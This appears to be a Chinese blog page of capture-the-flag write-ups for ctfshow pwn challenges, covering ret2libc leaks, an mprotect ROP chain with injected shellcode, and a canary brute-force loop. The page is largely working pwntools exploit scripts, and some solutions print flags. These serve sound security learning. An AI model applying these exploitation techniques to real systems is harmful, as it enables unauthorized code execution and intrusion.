              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/beijing.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CTFshow-Pwn-10月记录"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-10-31 00:00" pubdate>
          2025年10月31日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          13k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          105 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CTFshow-Pwn-10月记录</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h2><p>后边栈溢出学的差不多了，我们来回顾一下把这题ret2libc做了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120826420-1ac0deb3-8c11-4eb9-8412-98def1cb2429.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120928116-5027b2f0-22bd-4e1a-8c1a-1910d7a6ef0f.png" srcset="/img/loading.gif" lazyload></p>
<p>跟题目说的一样，只开了个NX保护，而且是动态，可用ret2libc</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120970860-bf87eaf2-1371-4dc8-944a-b96bc6b412bd.png" srcset="/img/loading.gif" lazyload><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120979114-3e46fac3-2606-47d8-bc8b-4aa9119e1903.png" srcset="/img/loading.gif" lazyload></p>
<p>而且在主函数的ctfshow函数可以找到栈溢出的点</p>
<p>padding&#x3D;0x88+4</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759121464723-7675afe9-5d87-4f31-9472-56323305cea6.png" srcset="/img/loading.gif" lazyload></p>
<p>这边用了一堆的puts函数，直接puts泄露偏移地址了</p>
<p>main &#x3D; elf.symbols[“main”]</p>
<p>puts_plt &#x3D; elf.plt[“puts”]</p>
<p>puts_got &#x3D; elf.got[“puts”]</p>
<p>payload1&#x3D;b’a’*padding+p32(puts_plt)+p32(main)+p32(puts_got)</p>
<p>这边还是一模一样的做法，我们直接将puts_got的值作为参数让puts输出出来</p>
<p>puts &#x3D; u32(io.recvuntil(“\xf7”)[-4:])</p>
<p>于是在截断后我们就可以利用libcsearcher库直接找到libc库了</p>
<p>然后搞到基地址之后system和&#x2F;bin&#x2F;sh就都有了</p>
<p>来写代码吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from LibcSearcher import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28246)<br>elf=ELF(&quot;./pwn25&quot;)<br><br>main=elf.symbols[&quot;main&quot;]<br>puts_plt=elf.plt[&quot;puts&quot;]<br>puts_got=elf.got[&quot;puts&quot;]<br>padding=0x88+4<br><br>payload1=b&quot;a&quot;*padding+p32(puts_plt)+p32(main)+p32(puts_got)<br>io.sendline(payload1)<br>puts=u32(io.recvuntil(&quot;\xf7&quot;)[-4:])<br><br>libc=LibcSearcher(&quot;puts&quot;,puts)<br>libc_base=puts-libc.dump(&quot;puts&quot;)<br>system=libc_base+libc.dump(&quot;system&quot;)<br>bin_sh=libc_base+libc.dump(&quot;str_bin_sh&quot;)<br><br>payload2=b&quot;a&quot;*padding+p32(system)+p32(0)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759122092875-153f65bd-da21-4a1d-ba74-3c67dec86275.png" srcset="/img/loading.gif" lazyload></p>
<p>OK这种标准的puts泄露的ret2libc没问题了</p>
<p>ctfshow{46745696-6f63-4d80-ab0e-f4c383b64575}</p>
<h2 id="pwn49"><a href="#pwn49" class="headerlink" title="pwn49"></a>pwn49</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759022546608-c6976fcd-bcdb-4d63-9949-4670dde9ae6f.png" srcset="/img/loading.gif" lazyload></h2><p>先去了解所谓的mprotect（）函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;unistd.h&gt;   <br>#include &lt;sys/mmap.h&gt;   <br>int mprotect(const void *start, size_t len, int prot);<br></code></pre></td></tr></table></figure>

<p>得知其主要是<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">可以用来修改一段指定内存区域的保护属性。</font></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759022875152-a67d9b1b-5c4b-488f-84a2-a7737e21b6eb.png" srcset="/img/loading.gif" lazyload></p>
<p>第三个参数的prot权限还是经典的4+2+1，即rwx</p>
<p>所以应该蛮好理解的，就是三个参数分别对应开头地址、长度、修改的保护属性数字（0-7）</p>
<p>主要是一个拿来改保护属性的函数</p>
<p>成功时返回 0；失败时返回 -1，并设置 <code>errno</code>来指示错误原因</p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759026663205-1a8d711a-9eec-4726-8b1f-d36e6a23db49.png" srcset="/img/loading.gif" lazyload></p>
<p>32位，开了NX和栈金丝雀保护</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759027632858-1974084c-799c-4a05-8a3e-b36b92fa68ee.png" srcset="/img/loading.gif" lazyload></p>
<p>静态的，不能用libc了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759026753610-a3d3290f-df80-42e1-873b-c1f8d9ec3515.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759026799410-1205f68d-0fc8-47a9-821c-0f07d979e7f8.png" srcset="/img/loading.gif" lazyload></p>
<p>简单来说就是不能简单地进行栈溢出了，因为存在有检测环节，除非绕过，否则栈溢出无效</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030425887-68995e9f-cbea-4eb7-a38a-7e1600785f7c.png" srcset="/img/loading.gif" lazyload></p>
<p>这边检测出来有栈金丝雀纯是checksec问题，其实没有的（）</p>
<p>溢出点：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028663981-c5db4bda-97b4-4c7c-b808-1f7e38f0fb7d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028669706-1838f6cd-43a0-41a5-b3b5-ad0b816935a8.png" srcset="/img/loading.gif" lazyload></p>
<p>padding&#x3D;0x12+4</p>
<p>题目无system，无&#x2F;bin&#x2F;sh，不能用libc</p>
<p>又知道这一题让我们用mprotect，既然能构造栈溢出了，那么mprotect可以给我们可写可读可执行的（7）能力，我们就能直接打shellcode了</p>
<p>先搜一下这个函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759027422477-7c961386-d2ab-46ad-9edf-8b1e983a11fe.png" srcset="/img/loading.gif" lazyload></p>
<p>没什么问题mprotect_addr&#x3D;0x0806CDD0</p>
<p>然后找一下mprotect的三个参数，首先是要写到哪边</p>
<p>ctrl+s调出程序的段表</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028064304-3e61b559-93a8-4e78-87a5-235b4ea176a1.png" srcset="/img/loading.gif" lazyload></p>
<p>选择.got.plt作为更改的程序</p>
<p>因为这个<code>.got.plt</code>在程序加载时的地址是固定的（静态链接时确定）。攻击者可以提前知道目标函数（如 <code>printf</code>）的 GOT 条目在内存中的确切位置，这比在堆栈上寻找动态变化的地址要容易得多。</p>
<p>同时我们劫持 <code>.got.plt</code>后，不需要复杂的操作来触发执行流转向。你只需要等待程序正常地调用被你覆盖的那个库函数，劫持就会自动发生。</p>
<p>所以这个会作为mprotect的第一个参数地址，got_plt&#x3D;0x080DA000</p>
<p>然后长度我们写个0x1000，保证能写即可</p>
<p>最后保护属性当然是0x7了</p>
<p>这边注意我们要传三个参数，必须用一下pop寄存器，否则执行完这个函数会直接回到栈顶，无法读取三个参数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028760189-3bc81d1a-8605-43f9-9708-34a3ffc4dfc1.png" srcset="/img/loading.gif" lazyload></p>
<p>有了这个，我们就能平稳地接受这仨参数，然后执行mprotect的函数任务</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030018622-c76e5a31-a1c4-404c-9de0-d9f509692662.png" srcset="/img/loading.gif" lazyload></p>
<p>所以这三个很关键，我们在传参前要先返回这个的头地址，即0x08061C3B，辅助我们填参</p>
<p>之后修改完权限我们当然要直接去读写执行那个改完的东西了</p>
<p>我们选一个read函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759029052286-bf180840-7c06-41a2-ab6f-696098dbbc1f.png" srcset="/img/loading.gif" lazyload></p>
<p>read函数也是三个参数，所以需要再次调用pop那仨</p>
<p>read的三个参数分别代表着fd、buf、size</p>
<p>read地址：0x0806BEE0</p>
<p>pop地址：0x08056194</p>
<p>fd直接0读取就行</p>
<p>buf得是刚刚写的地方0x80DA000</p>
<p>size就是大小，无所谓随便填大点就是了</p>
<p>于是我们可以构造payload：</p>
<p>首先栈溢出、然后跳到mprotect的位置，接下来返回pop三个寄存器，然后把三个参数填入，成功修改0x80DA000地址的保护属性，可以写了</p>
<p>然后我们去读取一下这个地方的内容，直接read，pop然后三个参数fd、buf，size，最后返回buf的地方</p>
<p>现在程序会读这个地了，我们就需要构造shellcode传进去了</p>
<p>这反而是最简单的一步了，我们只需要直接shellcode&#x3D;asm(shellcraft.sh())就完事了</p>
<p>好我们去写一下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28121)<br><br>padding=0x12+4<br>mprotect_addr=0x0806CDD0<br>pop_3=0x008061C3B<br>got_plt=0x080DA000<br>size=0x1000<br>prot=0x7<br><br>read_addr=0x0806BEE0<br>fd=0<br><br>shellcode=asm(shellcraft.sh())<br><br>payload =b&quot;a&quot;*padding+p32(mprotect_addr)+p32(pop_3)+p32(got_plt)+p32(size)+p32(prot)<br>payload+=p32(read_addr)+p32(pop_3)+p32(fd)+p32(got_plt)+p32(size)+p32(got_plt)<br><br>io.sendline(payload)<br>io.sendline(shellcode)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030282755-8ab7af3b-fd4d-40eb-944c-07926d465193.png" srcset="/img/loading.gif" lazyload></p>
<p>得到flag：ctfshow{91e14279-f90a-4528-b727-a5c8387dfe3c}</p>
<h2 id="pwn50"><a href="#pwn50" class="headerlink" title="pwn50"></a>pwn50</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030354101-0500cf5e-6fc9-431c-b29b-cbb9c981b95d.png" srcset="/img/loading.gif" lazyload></p>
<p>好像哪里不一样了</p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030334364-78f7cf5f-6fb7-4677-8f98-a1b3f694c7fa.png" srcset="/img/loading.gif" lazyload></p>
<p>保护没啥可看的，还是差不多不让写shellcode而已</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033471205-2a2b7db3-ae20-4fb2-9ab1-ab73afb7841d.png" srcset="/img/loading.gif" lazyload></p>
<p>哦？有点不一样似乎是在指这个，因为变成了动调，可以用libc库了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033340965-da687319-c1bd-4ab2-b963-820e3fa1fbde.png" srcset="/img/loading.gif" lazyload></p>
<p>简洁的main函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033421749-1e60c451-f706-4e97-9fc5-bbe0e9be5b37.png" srcset="/img/loading.gif" lazyload></p>
<p>溢出点变成了ctfshow函数中的gets函数</p>
<p>padding &#x3D; 0x20+8</p>
<p>无system，无&#x2F;bin&#x2F;sh，能libc，那我为什么不直接libc？这不是和pwn46一模一样的题目吗？我们改改信息地址即可</p>
<p>ROPgadget –binary “pwn50” –only “pop|ret”</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033751777-ff2e4e11-d0fa-4687-b072-de2dc2cc7bc2.png" srcset="/img/loading.gif" lazyload></p>
<p>rdi&#x3D;0x004007e3</p>
<p>ret&#x3D;0x004004fe</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033929040-a96eebf7-345d-4d80-9f3d-60e374a69b71.png" srcset="/img/loading.gif" lazyload></p>
<p>这边问题主要是libcsearcher找不到这个libc库</p>
<p>太麻烦了libc &#x3D; ELF(“&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6”)</p>
<p>这边其实主要肯定不是让我们直接逃课ret2libc，估计是想让我们去libc调mprotect，但是我搞不到这个libc库，麻烦死了</p>
<p>这边的知识点主要是在ROPgadget找不到单独的rdi和rsi的pop时，如何从libc中获取</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759034619149-80064423-983e-4b6d-892c-47bfd9f2e927.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>（这题我就是出不来，不管是不是本地开libc，甚至直接copy别人的wp也出不来，跳了）</p>
</blockquote>
<p>我发现在ctfshow的虚拟机能做，可能是libcsearcher的原因吧</p>
<p>这边甚至可以选10种库</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688985239-070b71ce-e919-4a64-9d66-890e053c71e3.png" srcset="/img/loading.gif" lazyload></p>
<p>因为是64位的我们选1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from LibcSearcher import *<br>elf = ELF(&#x27;./pwn50&#x27;)<br>p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)<br><br>putsplt = elf.plt[&#x27;puts&#x27;]<br>putsgot = elf.got[&#x27;puts&#x27;]<br>main_addr = elf.sym[&#x27;main&#x27;]<br>rdi_addr = 0x4007e3 <br>ret_addr = 0x4004fe<br>payload1 = b&#x27;b&#x27; * 40 + p64(rdi_addr) + p64(putsgot) + p64(putsplt) + p64(main_addr) <br><br>p.sendlineafter(b&#x27;Hello CTFshow\n&#x27;,payload1)<br>puts_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts_addr))<br><br>libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)<br>base = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = base + libc.dump(&#x27;system&#x27;)<br>binsh_addr = base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br>payload2 = b&#x27;a&#x27; * 40 + p64(ret_addr) + p64(rdi_addr) + p64(binsh_addr) + p64(system_addr) <br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760689010103-53679acc-85ce-46b0-9e11-36517cbb72bb.png" srcset="/img/loading.gif" lazyload></p>
<p>弥补空缺</p>
<h2 id="pwn51"><a href="#pwn51" class="headerlink" title="pwn51"></a>pwn51</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759124458723-fa8c2486-7b05-46bc-b818-371286d977d4.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759124498454-49fe1e39-c355-4ceb-86eb-e2578c6c6b7b.png" srcset="/img/loading.gif" lazyload></p>
<p>这边只开了NX，是个动态的32位程序</p>
<p>main函数太复杂了，我们先nc尝试一下</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550213922-4be6b0f4-ad26-4af5-b689-f820c86cfe4c.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550245427-e8be4b55-04cd-437a-8264-40172921e2dc.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以发现变的奇怪了，只要输入I就会自己先补齐后边的ronman</p>
<p>所以虽然只允许我们输入20个，我们却能1变7</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550317742-7f268577-d3dd-4a23-9bbd-82e4e8bc2328.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550280700-74673e3e-ccc3-411f-94e9-42bb67b2d5bc.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550294230-ff9e44a6-8431-47ea-b9a2-e2c3ad4fb8ef.png" srcset="/img/loading.gif" lazyload></p>
<p>就能把这个0x6C+4挤满</p>
<p>所以只要输入16个I就满了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550568581-3f715642-85c1-4547-9c51-1049990280b2.png" srcset="/img/loading.gif" lazyload></p>
<p>到这就好</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550583262-6f90e7ff-84d1-4c10-bd30-0d2b81f7f647.png" srcset="/img/loading.gif" lazyload></p>
<p>system&#x3D;0x0804902E</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28166)<br>system=0x0804902E<br>payload=b&quot;I&quot;*16+p32(system)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550841002-e49cece9-8cef-4c60-b42d-9906c1d103b8.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{4e359fed-acca-4424-a7f1-811f600a4200}</p>
<h2 id="pwn52"><a href="#pwn52" class="headerlink" title="pwn52"></a>pwn52</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550865813-6a889ed9-2e2b-4adb-b4b8-d95dff208c6c.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551018563-6e4c1529-9998-4d23-befc-275250c7e65a.png" srcset="/img/loading.gif" lazyload></p>
<p>就开了NX，没什么保护，32位（亲切）</p>
<p>动态的</p>
<p>我们放ida看看</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551069475-94961176-cdc5-4dfb-b83c-28e1f82e1654.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551078660-94b882ba-06d8-4641-89db-4148c4a074bb.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551124661-9417796f-2ccd-4ea0-8663-7eb370e087af.png" srcset="/img/loading.gif" lazyload></p>
<p>gets函数溢出</p>
<p>padding&#x3D;0x6C+4</p>
<p>然后看到有个flag函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551273720-b65e8180-8804-4251-9d85-a2f0c41916a4.png" srcset="/img/loading.gif" lazyload></p>
<p>一定要a1&#x3D;&#x3D;876且a2&#x3D;&#x3D;877才显示内容</p>
<p>所以我们就要调用这个函数的时候传俩参数过去呗</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551319006-ad06e2c7-5c3e-44f6-8a46-ad2fc6c467dd.png" srcset="/img/loading.gif" lazyload></p>
<p>flag_addr&#x3D;0x08048586</p>
<p>写代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28266)<br><br>padding=0x6C+4<br>flag_addr=0x08048586<br><br>payload=b&quot;a&quot;*padding+p32(flag_addr)+p32(0)+p32(876)+p32(877)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551671524-449ce728-a7b5-4fd9-9612-7049a8b61023.png" srcset="/img/loading.gif" lazyload></p>
<p>得到flag</p>
<p>ctfshow{afe530fc-175e-41f9-9f42-8ac67e3510d0}</p>
<h2 id="pwn53"><a href="#pwn53" class="headerlink" title="pwn53"></a>pwn53</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759657955880-b219a59d-dcef-4a0c-bfa5-4f85d6a69543.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759658440816-e78fddef-ee37-4ed2-8927-c86d18625532.png" srcset="/img/loading.gif" lazyload></p>
<p>32位，保护就开了个NX，动态</p>
<p>但是在本地我们可以看到有栈金丝雀函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659453601-e3e9d285-53d1-431e-a7c0-1d7aef83ae8f.png" srcset="/img/loading.gif" lazyload></p>
<p>这边是模拟的栈金丝雀效果，但是这个是静态的，相对好不少，虽然一样要爆破</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659465425-4a960bcd-a52e-463f-8c69-823b197b574d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659519584-44735a1f-1371-4c2d-9ae1-4b084eb7cb48.png" srcset="/img/loading.gif" lazyload></p>
<p>溢出点明显在这边</p>
<p>后门函数也很好找，就在flag函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659578752-a8258b89-58c9-4982-a9cc-133819737f55.png" srcset="/img/loading.gif" lazyload></p>
<p>所以我们第一步就是暴力破解canary</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759661134460-6da69a93-c5bb-4af9-b4e2-b73fb31c2d6a.png" srcset="/img/loading.gif" lazyload></p>
<p>我们这边程序会读取s1的内容与全局变量global_canary的值进行对比，如果不相等就代表栈被破坏，直接gg，所以需要爆破这四个字节，爆出来之后，再通过read函数的漏洞栈溢出返回flag函数地址</p>
<p>为了破解Canary，因为他一般是4字节，所以我们要逐字节去破解</p>
<p>先初始化，后边大循环4次</p>
<p>内部就一个个试，一个个试过来到底谁是真正的Canary值，主要是因为这边是静态的</p>
<p>一个字节占 8 位最大为 0xff，十进制就是255，所以遍历0-255也就是range(256)</p>
<p>每次都连接，直到成功得到所谓的Canary值，直到我们得到它才停</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759661352825-51ea183a-17db-4469-8d09-838ea0f14b8e.png" srcset="/img/loading.gif" lazyload></p>
<p>这边第一个填的数字会影响到我后边能往buf里塞多少东西，所以不能填小了，填个200大一点。当然也可以写-1，直接整数溢出变成0xFFFFFFF了</p>
<p>填完200之后就可以开始爆破，一直到得到正确的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">canary = b&#x27;&#x27;<br>for i in range(4):<br>    for guess in range(256):<br>        io = remote(&quot;pwn.challenge.ctf.show&quot;,28178)<br>        io.sendlineafter(&#x27;&gt;&#x27;,&#x27;200&#x27;)<br>        payload = cyclic(0x30 - 0x10) + canary + p8(guess)<br>        io.sendafter(&#x27;$ &#x27;,payload)<br>        answer = str(io.recv())<br>        if &quot;Canary Value Incorrect!&quot; not in answer:<br>            canary += p8(guess)<br>            break<br>        else:<br>            io.close()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759661419365-6ee84bcd-c5a2-4ed5-bf43-f0c0cf6f0219.png" srcset="/img/loading.gif" lazyload></p>
<p>得到了就好做了，这边难点就是爆破掉这个静态的Canary，这边可以看到buf到s1的偏移值为0x20，所以0x20就溢出了，下边的数据会到s1去</p>
<p>s1是canary是参数，所以我们先搞0x20溢出，然后后边紧跟爆出来的canary就可以避开检测了</p>
